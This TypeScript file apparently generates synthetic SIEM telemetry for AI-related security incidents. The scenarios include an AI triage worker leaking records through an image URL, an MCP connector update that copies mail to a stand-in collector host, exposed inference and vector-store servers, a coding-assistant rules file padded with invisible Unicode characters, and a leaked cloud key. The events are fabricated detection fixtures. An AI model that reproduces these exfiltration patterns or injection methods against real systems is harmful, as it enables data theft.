    dnsRow({ id: "ai4tk06", ts: "2026-10-22T10:33:14.000Z", on: { host: worker.host, ip: worker.ip }, query: imgHost, answer: "203.0.113.175", severity: "low", mitre: "T1567", tactic: "Exfiltration",
      description: `${worker.host} resolved ${imgHost}.` }),
    web({ host: worker.host, ip: worker.ip, user: worker.user }, {
      id: "ai4tk07", ts: "2026-10-22T10:33:15.000Z", url: `https://${imgHost}/p.png?d=x7QmZ2lkPTQ0ODcxJnBsYW49ZW50ZXJwcmlzZSZyZWdpb249d2V1JmNvdW50PTUwMA&n=500`, domain: imgHost, dstIp: "203.0.113.175", category: "newly-registered-domain",
      method: "GET", action: "alert", status: 200, bytesIn: 68, bytesOut: 48_204, userAgent: "ai-triage-worker/2.4", severity: "high", mitre: "T1567", tactic: "Exfiltration",
      description: `Firewall URL log: ${worker.host} requested p.png on ${imgHost} with the ai-triage-worker agent, category newly-registered-domain, action alert. About 48 KB out, 68 bytes back, and a long query string.`,
    }),
    ticket({
      id: "ai4tk08", ts: "2026-10-22T10:33:41.000Z", number: "INC0091182", state: "In Progress", caller: support, severity: "medium", mitre: "T1213", tactic: "Collection",
      shortDescription: "Billing question about a duplicate charge",
      extra: { "servicenow.category": "Billing", "servicenow.opened_by": "customer.portal", "servicenow.assigned_to": support, "servicenow.sys_updated_on": "2026-10-22 10:33:41",
        "servicenow.work_notes": "AI triage: billing request, order 44871, 500 records read, public comment posted to customer." },
      description: "ServiceNow update on INC0091182: the AI triage note says 500 records read and a public comment posted to the customer.",
    }),
    sentinel({
      id: "ai4tk09", ts: "2026-10-22T10:41:20.000Z", host: worker.host, srcIp: worker.ip, user: worker.user, severity: "high", eventType: "cloud_api_call", mitre: "T1567", tactic: "Exfiltration",
      alertName: "AI service account bulk record read followed by a request to a new external domain",
      detail: "One service account read more than 100 rows of a customer table and, within a minute, reached a domain first seen today.",
      startTime: "2026-10-22T10:33:09.000Z", endTime: "2026-10-22T10:33:15.000Z",
      extendedProperties: { "Service account": "svc-ai-triage", "Ticket context": "INC0091182", "Rows read": 500, "External domain": imgHost, "Bytes out": 48204 },
      description: `Microsoft Sentinel joined svc-ai-triage's 500-row read of customer_account to its request to ${imgHost} six seconds later, both in the context of INC0091182.`,
    }),
  ], "inc:ai4tk");
}

// ══════════════════════════════════════════════════════════════════════════════
// 4. An approved MCP connector changes after approval
// ══════════════════════════════════════════════════════════════════════════════
function buildMcpUpdateDrift(channel: "mail" | "https"): TelemetryEvent[] {
  const pkg = "mail-relay-mcp";
  const ext = "archive@mailbridge-metrics.example";
  const extDomain = "mailbridge-metrics.example";
  const senderUser = DEV.user;
  const npx = (v: string) => `"${NODE}" "C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npx-cli.js" -y ${pkg}@${v}`;
  const srvPid = 9120;
  const relayApi = "api.mailrelay-service.example";
  const collector = "collector.mailbridge-metrics.example";
  const outbound = (o: { id: string; ts: string; to: string; subject: string; severity: TelemetryEvent["severity"]; description: string; mitre?: string; tactic?: string }): TelemetryEvent => ({
    id: o.id, ts: o.ts, source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_sent", severity: o.severity,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}), ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    description: o.description,
    raw: {
      "email.from.address": "notifications@nexacorp.com", "email.sender.address": "notifications@nexacorp.com", "email.to.address": o.to, "email.subject": o.subject, "email.direction": "outbound",
      "email.message_id": `<${makeSha256(`wave4:mcp:msg:${o.subject}`).slice(0, 32)}@nexacorp.com>`,
      "data.office365.Directionality": "Outbound", "data.office365.DeliveryAction": "Delivered", "data.office365.DeliveryLocation": "On-premises/external",
      "data.office365.Sender": "notifications@nexacorp.com", "data.office365.SenderFromDomain": "nexacorp.com",
      "data.office365.NetworkMessageId": makeSha256(`wave4:mcp:net:${o.subject}`).slice(0, 36), "data.office365.Subject": o.subject, "data.office365.RecipientEmailAddress": o.to,
      "data.office365.AttachmentCount": "0", "data.office365.CreationTime": o.ts, "action_result": "allowed",
    },
  });

  return withIncident([
    benign(ticket({
      id: "ai4mc01", ts: "2026-10-05T09:02:00.000Z", table: "change_request", number: "CHG0079121", state: "Closed", caller: senderUser, severity: "informational",
      shortDescription: `Approve MCP server ${pkg} 1.0.15 for the release-notes agent`,
      extra: { "servicenow.category": "Software", "servicenow.approved_by": "AI Governance Board", "servicenow.u_package_name": pkg, "servicenow.u_package_version": "1.0.15", "servicenow.risk": "Low",
        "servicenow.work_notes": "Tool definitions reviewed at version 1.0.15. Tools: send_email, list_templates. Destinations: customer list only." },
      description: `ServiceNow change CHG0079121: AI Governance approved MCP server ${pkg} at version 1.0.15 with two tools, send_email and list_templates.`,
    }), "The approval on record: it names the package and the reviewed version, which is what later versions are compared against."),
    benign(proc(dev, {
      id: "ai4mc02", ts: "2026-10-19T09:10:30.000Z", pid: 8900, processName: "node.exe", processPath: NODE, parentName: "code-agent.exe", parentPid: 8800, cmdline: npx("1.0.15"),
      severity: "informational", description: `The coding agent on ${DEV.host} started MCP server ${pkg} at version 1.0.15.`,
    }), "The approved version of the connector, started the way the agent starts it every day."),
    channel === "mail"
      ? benign(outbound({ id: "ai4mc03", ts: "2026-10-19T09:12:11.000Z", to: "customer.updates@list.nexacorp.com", subject: "Release notes, sprint 41", severity: "informational",
        description: "Defender for Office 365 EmailEvents: outbound mail from notifications@nexacorp.com to the customer list, subject Release notes, sprint 41." }),
        "The agent's normal release note to the customer list, one recipient row.")
      : benign(web(dev, {
        id: "ai4mc03", ts: "2026-10-19T09:12:11.000Z", url: `https://${relayApi}/v1/send`, domain: relayApi, dstIp: "203.0.113.180", category: "business-and-economy", method: "POST", action: "allow", status: 202, bytesIn: 310, bytesOut: 9120,
        userAgent: "mail-relay-mcp/1.0.15", severity: "informational", description: `Firewall URL log: ${DEV.host} POSTed about 9 KB to ${relayApi}, the mail provider's API, with the mail-relay-mcp/1.0.15 agent.`,
      }), "The connector calling the mail provider it is approved to use."),

    fileRow(dev, {
      id: "ai4mc04", ts: "2026-10-26T08:55:02.000Z", path: `${home}\\.agent\\mcp.json`, size: 912, action: "file_modify", sha256: makeSha256("wave4:mcp:config"), actorProcess: "Code.exe",
      actorPath: `${home}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe`, severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `Code.exe changed ${home}\\.agent\\mcp.json on ${DEV.host}. The file holds the agent's MCP server list.`,
    }),
    web(dev, {
      id: "ai4mc05", ts: "2026-10-26T09:10:18.000Z", url: `https://registry.npmjs.org/${pkg}/-/${pkg}-1.0.16.tgz`, domain: "registry.npmjs.org", dstIp: "192.0.2.90", category: "computer-and-internet-info",
      method: "GET", action: "allow", status: 200, bytesIn: 48_122, bytesOut: 640, userAgent: "npm/10.9.0 node/v22.11.0 win32 x64", severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `Firewall URL log: ${DEV.host} fetched ${pkg}-1.0.16.tgz from the public npm registry.`,
    }),
    proc(dev, {
      id: "ai4mc06", ts: "2026-10-26T09:10:21.000Z", pid: srvPid, processName: "node.exe", processPath: NODE, parentName: "code-agent.exe", parentPid: 8800, cmdline: npx("latest"),
      severity: "medium", mitre: "T1195.002", tactic: "Initial Access",
      description: `The coding agent started MCP server ${pkg} with the tag latest, which resolved to 1.0.16.`,
    }),
    fileRow(dev, {
      id: "ai4mc07", ts: "2026-10-26T09:10:22.000Z", path: `${home}\\AppData\\Local\\npm-cache\\_npx\\5e1a\\node_modules\\${pkg}\\dist\\index.js`, size: 41_288, action: "file_create", sha256: makeSha256("wave4:mcp:index-1.0.16"),
      actorProcess: "node.exe", actorPath: NODE, actorPid: srvPid, severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `node.exe wrote the package's dist\\index.js into the npx cache, version 1.0.16.`,
    }),
    ...(channel === "mail" ? [
      benign(outbound({ id: "ai4mc08", ts: "2026-10-26T09:31:47.000Z", to: "customer.updates@list.nexacorp.com", subject: "Release notes, sprint 42", severity: "informational",
        description: "Defender for Office 365 EmailEvents: outbound mail from notifications@nexacorp.com to the customer list, subject Release notes, sprint 42." }),
        "The intended recipient of the message: the customer list."),
      outbound({ id: "ai4mc09", ts: "2026-10-26T09:31:47.400Z", to: ext, subject: "Release notes, sprint 42", severity: "medium", mitre: "T1114", tactic: "Collection",
        description: `Defender for Office 365 EmailEvents: the same message also has a recipient row for ${ext}, an external domain. The earlier sends have one recipient row.` }),
      outbound({ id: "ai4mc10", ts: "2026-10-26T11:02:09.000Z", to: ext, subject: "Your password reset link", severity: "high", mitre: "T1114", tactic: "Collection",
        description: `Defender for Office 365 EmailEvents: a mail with subject Your password reset link from notifications@nexacorp.com has a recipient row for ${ext}.` }),
      sentinel({
        id: "ai4mc11", ts: "2026-10-26T11:14:30.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, severity: "high", eventType: "email_sent", mitre: "T1114", tactic: "Collection",
        alertName: "New external recipient on automated outbound mail",
        detail: "An automation sender that mails one recipient per message has a second recipient row at a domain with no prior mail from this organization.",
        startTime: "2026-10-26T09:31:47.000Z", endTime: "2026-10-26T11:02:09.000Z",
        extendedProperties: { Sender: "notifications@nexacorp.com", "External recipient": ext, "Recipient domain": extDomain, "Messages affected": 2, "First seen": "2026-10-26T09:31:47Z" },
        description: `Microsoft Sentinel flagged ${ext} as a new external recipient on mail from notifications@nexacorp.com.`,
      }),
    ] : [
      benign(web(dev, {
        id: "ai4mc08", ts: "2026-10-26T09:31:47.000Z", url: `https://${relayApi}/v1/send`, domain: relayApi, dstIp: "203.0.113.180", category: "business-and-economy", method: "POST", action: "allow", status: 202, bytesIn: 310, bytesOut: 9344,
        userAgent: "mail-relay-mcp/1.0.16", severity: "informational", description: `Firewall URL log: ${DEV.host} POSTed about 9 KB to ${relayApi} with the mail-relay-mcp/1.0.16 agent.`,
      }), "The send itself, to the approved mail provider."),
      dnsRow({ id: "ai4mc09", ts: "2026-10-26T09:31:47.300Z", on: dev, query: collector, answer: "203.0.113.176", severity: "low", mitre: "T1567", tactic: "Exfiltration",
        description: `${DEV.host} resolved ${collector}. The name has no earlier lookups in the retained DNS history.` }),
      web(dev, {
        id: "ai4mc10", ts: "2026-10-26T09:31:47.900Z", url: `https://${collector}/v1/copy`, domain: collector, dstIp: "203.0.113.176", category: "newly-registered-domain", method: "POST", action: "alert", status: 200, bytesIn: 120, bytesOut: 9344,
        userAgent: "mail-relay-mcp/1.0.16", repeatCount: 41, severity: "high", mitre: "T1567", tactic: "Exfiltration",
        description: `Firewall URL log: ${DEV.host} POSTed the same size, 9,344 bytes, to ${collector}, 41 repeated sessions on this record, with the mail-relay-mcp/1.0.16 agent.`,
      }),
      sentinel({
        id: "ai4mc11", ts: "2026-10-26T11:14:30.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, severity: "high", eventType: "http_request", mitre: "T1567", tactic: "Exfiltration",
        alertName: "Agent tool process reached a newly registered domain",
        detail: "A process started by a coding agent sent repeated POSTs to a domain first seen today, right after each call to its usual API.",
        startTime: "2026-10-26T09:31:47.000Z", endTime: "2026-10-26T11:02:09.000Z",
        extendedProperties: { Host: DEV.host, Domain: collector, "Client agent": "mail-relay-mcp/1.0.16", Sessions: 41, "Approved version": "1.0.15" },
        description: `Microsoft Sentinel flagged 41 sessions from ${DEV.host} to ${collector} with the mail-relay-mcp/1.0.16 agent.`,
      }),
    ]),
  ], "inc:ai4mc");
}

// ══════════════════════════════════════════════════════════════════════════════
// 5. An inference server reachable from the internet
// ══════════════════════════════════════════════════════════════════════════════
function buildExposedInference(): TelemetryEvent[] {
  const srv = { host: "SRV-NXC-APP12", ip: "10.10.20.112", user: "svc-mlbench@nexacorp.com" };
  const ollama = "C:\\Services\\ollama\\ollama.exe";
  const scanner = "198.51.100.182";
  const user2 = "198.51.100.183";
  return withIncident([
    benign(conn(dev, {
      id: "ai4ol01", ts: "2026-10-23T08:40:10.000Z", dstIp: srv.ip, remotePort: 11434, app: "web-browsing", action: "allow", end: true, toZone: "trust", bytesOut: 2204, bytesIn: 18_840, elapsedSec: 4,
      severity: "informational", description: `Firewall session end: ${DEV.host} reached ${srv.ip} on port 11434, internal zone.`,
    }), "The ML team's own workstation calling the benchmark server from the internal zone."),
    proc(srv, {
      id: "ai4ol02", ts: "2026-10-23T09:02:44.000Z", pid: 3120, processName: "setx.exe", processPath: "C:\\Windows\\System32\\setx.exe", parentName: "cmd.exe", cmdline: "setx.exe OLLAMA_HOST 0.0.0.0:11434 /M",
      severity: "low", description: `setx.exe set the machine variable OLLAMA_HOST to 0.0.0.0:11434 on ${srv.host}.`,
    }),
    proc(srv, {
      id: "ai4ol03", ts: "2026-10-23T09:03:30.000Z", pid: 3388, processName: "ollama.exe", processPath: ollama, parentName: "services.exe", cmdline: `"${ollama}" serve`, severity: "low",
      description: `ollama.exe serve started on ${srv.host}.`,
    }),
    inbound({
      id: "ai4ol04", ts: "2026-10-23T14:11:02.000Z", fromIp: scanner, server: srv.host, serverIp: srv.ip, port: 11434, app: "web-browsing", bytesIn: 420, bytesOut: 2880, elapsedSec: 1,
      severity: "low", mitre: "T1595", tactic: "Reconnaissance", description: `Firewall log: ${scanner} reached ${srv.host} on port 11434 through a published rule, allowed.`,
    }),
    conn({ host: srv.host, ip: scanner, user: null }, {
      id: "ai4ol05", ts: "2026-10-23T14:11:03.000Z", url: `http://${srv.ip}:11434/api/tags`, dstIp: srv.ip, remotePort: 11434, app: "web-browsing", category: "unknown", action: "alert",
      direction: "inbound", severity: "medium", mitre: "T1595", tactic: "Reconnaissance",
      description: `Firewall URL log: GET /api/tags from ${scanner} to ${srv.host}.`,
    }),
    netRow({ host: srv.host, ip: srv.ip, user: srv.user }, {
      id: "ai4ol06", ts: "2026-10-23T14:26:40.000Z", remoteIp: user2, remotePort: 51244, localPort: 11434, direction: "inbound", processName: "ollama.exe", processPath: ollama, pid: 3388, parentName: "services.exe",
      bytesOut: 18_402_112, bytesIn: 2_210_448, severity: "medium", mitre: "T1133", tactic: "Initial Access",
      description: `ollama.exe accepted an inbound session from ${user2}, about 18 MB out and 2 MB in.`,
    }),
    conn({ host: srv.host, ip: user2, user: null }, {
      id: "ai4ol07", ts: "2026-10-23T14:26:41.000Z", url: `http://${srv.ip}:11434/api/generate`, dstIp: srv.ip, remotePort: 11434, app: "web-browsing", category: "unknown", action: "alert",
      repeatCount: 1842, direction: "inbound", severity: "high", mitre: "T1496.001", tactic: "Impact",
      description: `Firewall URL log: POST /api/generate from ${user2} to ${srv.host}, 1842 repeated sessions aggregated on this record.`,
    }),
    sentinel({
      id: "ai4ol08", ts: "2026-10-23T14:48:15.000Z", host: srv.host, srcIp: user2, severity: "high", eventType: "ueba_anomaly", mitre: "T1496.001", tactic: "Impact",
      alertName: "Internet sources reached an AI inference port on an internal server",
      detail: "Sessions from public addresses to TCP 11434 on a server with no published-service entry in the asset inventory.",
      startTime: "2026-10-23T14:11:02.000Z", endTime: "2026-10-23T14:45:00.000Z",
      extendedProperties: { Server: srv.host, Port: 11434, "Public sources": [scanner, user2], Requests: 1842, "Bound address": "0.0.0.0:11434" },
      description: `Microsoft Sentinel flagged sessions from ${scanner} and ${user2} to TCP 11434 on ${srv.host}, a server with no published-service entry.`,
    }),
  ], "inc:ai4ol");
}

// ══════════════════════════════════════════════════════════════════════════════
// 6. A vector store reachable from the internet
// ══════════════════════════════════════════════════════════════════════════════
function buildExposedVectorStore(): TelemetryEvent[] {
  const srv = { host: "SRV-NXC-APP14", ip: "10.10.20.114", user: DEV.user };
  const chroma = "C:\\Services\\rag-pilot\\venv\\Scripts\\chroma.exe";
  const reader = "198.51.100.184";
  return withIncident([
    benign(ticket({
      id: "ai4vs01", ts: "2026-10-12T10:00:00.000Z", table: "change_request", number: "CHG0079204", state: "Closed", caller: DEV.user, severity: "informational",
      shortDescription: "RAG pilot: vector store on an internal server",
      extra: { "servicenow.category": "Software", "servicenow.approved_by": "Change Advisory Board", "servicenow.risk": "Low", "servicenow.cmdb_ci": srv.host,
        "servicenow.work_notes": "Pilot store for the policy assistant. Internal zone only, port 8000, reached by the pilot app server." },
      description: `ServiceNow change CHG0079204: a pilot vector store on ${srv.host}, internal zone only, port 8000.`,
    }), "The approved pilot. Its scope is what the later firewall rows are read against: internal zone only."),
    benign(conn({ host: "SRV-NXC-APP07", ip: "10.10.20.70", user: null }, {
      id: "ai4vs02", ts: "2026-10-24T09:01:20.000Z", dstIp: srv.ip, remotePort: 8000, app: "web-browsing", action: "allow", end: true, toZone: "trust", bytesOut: 8420, bytesIn: 240_884, elapsedSec: 3,
      severity: "informational", description: `Firewall session end: the pilot app server reached ${srv.ip} on port 8000, about 240 KB back.`,
    }), "The pilot app querying its store from the internal zone, in the size range of one retrieval."),
    proc(srv, {
      id: "ai4vs03", ts: "2026-10-24T09:40:12.000Z", pid: 4120, processName: "chroma.exe", processPath: chroma, parentName: "cmd.exe", cmdline: `"${chroma}" run --host 0.0.0.0 --port 8000 --path C:\\Services\\rag-pilot\\data`,
      severity: "low", description: `chroma.exe run started on ${srv.host}, host 0.0.0.0, port 8000, data path C:\\Services\\rag-pilot\\data.`,
    }),
    inbound({
      id: "ai4vs04", ts: "2026-10-24T16:22:08.000Z", fromIp: reader, server: srv.host, serverIp: srv.ip, port: 8000, app: "web-browsing", bytesIn: 980, bytesOut: 6120, elapsedSec: 2,
      severity: "low", mitre: "T1595", tactic: "Reconnaissance", description: `Firewall log: ${reader} reached ${srv.host} on port 8000, allowed, 6 KB out.`,
    }),
    netRow(srv, {
      id: "ai4vs05", ts: "2026-10-24T16:24:30.000Z", remoteIp: reader, remotePort: 50112, localPort: 8000, direction: "inbound", processName: "chroma.exe", processPath: chroma, pid: 4120, parentName: "cmd.exe",
      bytesOut: 214_884_120, bytesIn: 41_220, severity: "high", mitre: "T1190", tactic: "Initial Access",
      description: `chroma.exe accepted a session from ${reader}, about 214 MB out.`,
    }),
    inbound({
      id: "ai4vs06", ts: "2026-10-24T16:39:51.000Z", fromIp: reader, server: srv.host, serverIp: srv.ip, port: 8000, app: "web-browsing", bytesIn: 88_412, bytesOut: 2_418_882_104, elapsedSec: 901,
      severity: "high", mitre: "T1041", tactic: "Exfiltration", description: `Firewall session end: ${reader} to ${srv.host} on port 8000, about 2.4 GB out over 15 minutes.`,
    }),
    sentinel({
      id: "ai4vs07", ts: "2026-10-24T16:52:44.000Z", host: srv.host, srcIp: reader, severity: "high", eventType: "ueba_anomaly", mitre: "T1041", tactic: "Exfiltration",
      alertName: "Large outbound transfer from an internal server to a public address",
      detail: "More than 1 GB left a server in the internal zone in one session to an address with no prior contact.",
      startTime: "2026-10-24T16:22:08.000Z", endTime: "2026-10-24T16:39:51.000Z",
      extendedProperties: { Server: srv.host, "Remote address": reader, Port: 8000, "Bytes out": 2418882104, "Change on record": "CHG0079204" },
      description: `Microsoft Sentinel flagged about 2.4 GB from ${srv.host} to ${reader} on port 8000.`,
    }),
  ], "inc:ai4vs");
}

// ══════════════════════════════════════════════════════════════════════════════
// 7. A coding assistant's rules file changes
// ══════════════════════════════════════════════════════════════════════════════
function buildRulesFileTamper(): TelemetryEvent[] {
  const repo = `${home}\\src\\portal-api`;
  const rules = `${repo}\\.github\\copilot-instructions.md`;
  const build = { host: "SRV-NXC-APP05", ip: "10.10.20.105", user: "svc-build@nexacorp.com" };
  const cdn = "cdn.pkg-insights.example";
  const GIT = "C:\\Program Files\\Git\\cmd\\git.exe";
  return withIncident([
    benign(fileRow(dev, {
      id: "ai4rf01", ts: "2026-10-27T08:30:40.000Z", path: rules, size: 1612, action: "file_modify", sha256: null, actorProcess: "git.exe", actorPath: GIT,
      severity: "informational", description: `git.exe updated .github\\copilot-instructions.md in portal-api on ${DEV.host}, 1,612 bytes.`,
    }), "A reviewed edit to the team's assistant guidance: a few lines more, delivered by an ordinary pull."),
    proc(dev, {
      id: "ai4rf02", ts: "2026-10-28T09:05:12.000Z", pid: 5504, processName: "git.exe", processPath: GIT, parentName: "Code.exe", cmdline: "git.exe pull origin main", severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `git.exe pull origin main in portal-api on ${DEV.host}.`,
    }),
    fileRow(dev, {
      id: "ai4rf03", ts: "2026-10-28T09:05:13.000Z", path: rules, size: 9844, action: "file_modify", sha256: makeSha256("wave4:rules:v2"), actorProcess: "git.exe", actorPath: GIT, actorPid: 5504,
      severity: "medium", mitre: "T1195.002", tactic: "Initial Access",
      description: `git.exe updated .github\\copilot-instructions.md to 9,844 bytes. The file was 1,612 bytes the day before.`,
    }),
    fileRow(dev, {
      id: "ai4rf04", ts: "2026-10-28T09:42:30.000Z", path: `${repo}\\src\\telemetry\\init.js`, size: 2210, action: "file_create", sha256: makeSha256("wave4:rules:init-js"), actorProcess: "Code.exe",
      actorPath: `${home}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe`, severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `Code.exe created src\\telemetry\\init.js in portal-api, 22 minutes before a commit that includes it.`,
    }),
    proc(dev, {
      id: "ai4rf05", ts: "2026-10-28T10:04:51.000Z", pid: 5720, processName: "git.exe", processPath: GIT, parentName: "Code.exe", cmdline: `git.exe commit -m "Add request telemetry helper" --trailer "Co-authored-by: code-assistant"`,
      severity: "low", mitre: "T1195.002", tactic: "Initial Access", description: `git.exe commit in portal-api with a co-author trailer naming the code assistant.`,
    }),
    proc(build, {
      id: "ai4rf06", ts: "2026-10-28T11:15:04.000Z", pid: 6120, processName: "node.exe", processPath: NODE, parentName: "cmd.exe", cmdline: `"${NODE}" scripts\\build.js --env production`, severity: "low",
      mitre: "T1059.007", tactic: "Execution", description: `The build agent ran node.exe scripts\\build.js --env production on ${build.host}.`,
    }),
    dnsRow({ id: "ai4rf07", ts: "2026-10-28T11:15:19.000Z", on: { host: build.host, ip: build.ip }, query: cdn, answer: "203.0.113.178", severity: "low", mitre: "T1071.001", tactic: "Command and Control",
      description: `${build.host} resolved ${cdn}. The build server has no earlier lookup of this name.` }),
    web({ host: build.host, ip: build.ip, user: build.user }, {
      id: "ai4rf08", ts: "2026-10-28T11:15:20.000Z", url: `https://${cdn}/v1/collect`, domain: cdn, dstIp: "203.0.113.178", category: "newly-registered-domain", method: "POST", action: "alert", status: 204, bytesIn: 120, bytesOut: 28_412,
      userAgent: "node/22.11.0", severity: "high", mitre: "T1041", tactic: "Exfiltration",
      description: `Firewall URL log: ${build.host} POSTed about 28 KB to ${cdn}, category newly-registered-domain, action alert, during the build.`,
    }),
    sentinel({
      id: "ai4rf09", ts: "2026-10-28T11:22:40.000Z", host: build.host, srcIp: build.ip, user: build.user, severity: "high", eventType: "http_request", mitre: "T1041", tactic: "Exfiltration",
      alertName: "Build server contacted a newly registered domain during a production build",
      detail: "A CI host sent data to a domain first seen today while a production build was running.",
      startTime: "2026-10-28T11:15:04.000Z", endTime: "2026-10-28T11:15:20.000Z",
      extendedProperties: { Host: build.host, Domain: cdn, "Bytes out": 28412, Repository: "portal-api", "Build process": "node.exe scripts\\build.js" },
      description: `Microsoft Sentinel flagged the POST to ${cdn} from ${build.host} during the portal-api production build.`,
    }),
    ticket({
      id: "ai4rf10", ts: "2026-10-28T12:10:18.000Z", number: "INC0091307", state: "In Progress", caller: DEV.user, severity: "medium",
      shortDescription: "portal-api build contacted an unknown domain",
      extra: { "servicenow.category": "Security", "servicenow.assignment_group": "SOC Tier 2", "servicenow.cmdb_ci": build.host,
        "servicenow.work_notes": "Diff of .github/copilot-instructions.md: 8,232 bytes added in one merged change; 7,940 of them are invisible Unicode tag characters that do not show in the review UI. src/telemetry/init.js names the same domain the build reached." },
      description: "ServiceNow incident INC0091307: the work note records that most of the bytes added to the rules file are invisible Unicode characters, and that init.js names the domain the build reached.",
    }),
  ], "inc:ai4rf");
}

// ══════════════════════════════════════════════════════════════════════════════
// 8. A coding agent's commit carries a key to a public repository
// ══════════════════════════════════════════════════════════════════════════════
function buildCommitKeyLeak(cloud: Cloud): TelemetryEvent[] {
  const GIT = "C:\\Program Files\\Git\\cmd\\git.exe";
  const remote = cloud === "aws" ? "198.51.100.185" : "198.51.100.186";
  const publicRepo = "https://github.com/nexacorp-labs/invoice-ocr-demo.git";
  const events: TelemetryEvent[] = [
    benign(proc(dev, {
      id: "ai4cs01", ts: "2026-10-29T08:50:11.000Z", pid: 7120, processName: "git.exe", processPath: GIT, parentName: "node.exe", parentPid: 7000,
      cmdline: "git.exe push origin feature/ocr-tuning", severity: "informational",
      description: `The coding agent ran git.exe push origin feature/ocr-tuning on ${DEV.host}.`,
    }), "The agent pushing a feature branch to the company's private remote, as it does every day."),
    proc(dev, {
      id: "ai4cs02", ts: "2026-10-29T10:01:40.000Z", pid: 7304, processName: "git.exe", processPath: GIT, parentName: "node.exe", parentPid: 7000, cmdline: "git.exe add -A", severity: "low",
      mitre: "T1552.001", tactic: "Credential Access", description: `The coding agent ran git.exe add -A in invoice-ocr-demo, with .env present in the working tree and no .gitignore.`,
    }),
    proc(dev, {
      id: "ai4cs03", ts: "2026-10-29T10:01:44.000Z", pid: 7340, processName: "git.exe", processPath: GIT, parentName: "node.exe", parentPid: 7000, cmdline: `git.exe commit -m "Initial OCR demo scaffolding"`, severity: "low",
      mitre: "T1552.001", tactic: "Credential Access", description: `The coding agent committed the working tree of invoice-ocr-demo.`,
    }),
    proc(dev, {
      id: "ai4cs04", ts: "2026-10-29T10:02:02.000Z", pid: 7388, processName: "git.exe", processPath: GIT, parentName: "node.exe", parentPid: 7000, cmdline: `git.exe push -u ${publicRepo} main`, severity: "medium",
      mitre: "T1567.001", tactic: "Exfiltration", description: `The coding agent pushed main to ${publicRepo}.`,
    }),
    web(dev, {
      id: "ai4cs05", ts: "2026-10-29T10:02:03.000Z", url: "https://github.com/nexacorp-labs/invoice-ocr-demo.git/git-receive-pack", domain: "github.com", dstIp: "192.0.2.91", category: "computer-and-internet-info",
      method: "POST", action: "allow", status: 200, bytesIn: 2204, bytesOut: 182_440, userAgent: "git/2.47.0.windows.1", severity: "low", mitre: "T1567.001", tactic: "Exfiltration",
      description: `Firewall URL log: ${DEV.host} POSTed about 182 KB to github.com for invoice-ocr-demo.`,
    }),
  ];
  if (cloud === "aws") {
    const key = "AKIAZ8WT3LMP6EXAMPLE";
    const user = "svc-ocr-demo";
    const arn = `arn:aws:iam::418772153604:user/${user}`;
    const common = { companyId: CX, srcIp: remote, actorType: "IAMUser" as const, actorName: user, accessKeyId: key, arn, userAgent: UA_BOTO, geo: { country: "Netherlands", city: "Amsterdam" } };
    events.push(
      cloudTrailEvent({ ...common, id: "ai4cs06", ts: "2026-10-29T10:06:51.000Z", eventName: "GetCallerIdentity", eventSource: "sts.amazonaws.com", readOnly: true, severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
        description: `AWS CloudTrail: GetCallerIdentity by ${key} (user ${user}) from ${remote}, under five minutes after the push.` }),
      cloudTrailEvent({ ...common, id: "ai4cs07", ts: "2026-10-29T10:07:30.000Z", eventName: "ListFoundationModels", eventSource: "bedrock.amazonaws.com", readOnly: true, severity: "medium", mitre: "T1526", tactic: "Discovery",
        description: `AWS CloudTrail: ListFoundationModels by the same key from ${remote}.` }),
      cloudTrailEvent({ ...common, id: "ai4cs08", ts: "2026-10-29T10:09:12.000Z", eventName: "InvokeModel", eventSource: "bedrock.amazonaws.com", extra: { "aws.cloudtrail.requestParameters.modelId": "anthropic.claude-sonnet-4-20250514-v1:0" }, severity: "high", mitre: "T1496.004", tactic: "Impact",
        description: `AWS CloudTrail: InvokeModel on anthropic.claude-sonnet-4-20250514-v1:0 by the same key from ${remote}. The key's only earlier use is an OCR service role in eu-west-1.` }),
      guardDutyFinding({
        id: "ai4cs09", ts: "2026-10-29T10:26:40.000Z", companyId: CX, findingType: "Impact:IAMUser/AnomalousModelInvocation", gdSeverity: 2,
        title: "An IAM identity invoked an Amazon Bedrock or Amazon SageMaker AI model in a way that deviates from the established baseline for the identity or account.",
        api: "InvokeModel", serviceName: "bedrock.amazonaws.com", callerType: "Remote IP", srcIp: remote, remoteCountry: "Netherlands", asnOrg: "hosting provider", resourceType: "AccessKey", userType: "IAMUser", userName: user, accessKeyId: key, count: 212,
        extra: { "aws.guardduty.resource.modelDetails": JSON.stringify([{ modelId: "anthropic.claude-sonnet-4-20250514-v1:0" }]) }, severity: "low", mitre: "T1496.004", tactic: "Impact",
        description: `GuardDuty raised Impact:IAMUser/AnomalousModelInvocation for ${key}: a model, IP address and user agent new for this identity, 212 invocations.`,
      }),
    );
    return withIncident(events, "inc:ai4cs:aws");
  }
  const geo = { country: "Netherlands", iso: "NL", city: "Amsterdam", lat: 52.3676, lon: 4.9041 };
  const bot = { resource: AOAI, deployment: "gpt-4o-ocr" };
  events.push(
    azureOpenAiRequest({ ...bot, id: "ai4cs06", ts: "2026-10-29T10:07:02.000Z", callerIp: remote, status: 200, durationMs: 1920, requestLength: 2210, responseLength: 1840, severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Azure OpenAI RequestResponse log: ChatCompletions_Create on gpt-4o-ocr from the ${remote.replace(/\.\d+$/, ".***")} range under five minutes after the push, authenticated by key.` }),
    azureOpenAiRequest({ ...bot, id: "ai4cs07", ts: "2026-10-29T10:14:44.000Z", callerIp: remote, status: 200, durationMs: 2640, requestLength: 11_208, responseLength: 8102, severity: "medium", mitre: "T1496.004", tactic: "Impact",
      description: `Azure OpenAI RequestResponse log: a larger ChatCompletions_Create on gpt-4o-ocr from the same range.` }),
